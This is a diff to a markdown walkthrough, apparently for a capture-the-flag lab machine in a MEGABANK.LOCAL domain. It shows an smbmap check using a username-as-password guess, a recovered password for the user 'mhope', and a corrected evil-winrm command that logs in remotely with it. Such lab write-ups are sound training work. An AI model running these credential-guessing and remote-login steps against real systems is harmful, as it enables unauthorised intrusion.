@@ -122,33 +122,12 @@ smbmap -H 10.129.228.111 -d MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs
 > ```
 > credentials `mhope`:`4n0therD4y@n0th3r$`
 
-## Foothold
+## Foothold & Exploitation
 
 ```bash
-evil -winrm -i10.129.228.111-
-mhope
-
--p
-
-'4n0therD4y@n0th3r$'
+evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
 ```
-
-### Exploitation
-
-Step-by-step exploitation.
-
-```bash
-# Commands here
-```
-
-Got a shell as `username`.
-
-## User Flag
-
-```bash
-cat /home/username/user.txt
-```
-
+Get user flag
 ## Privilege Escalation
 
 How you escalated to root/admin.
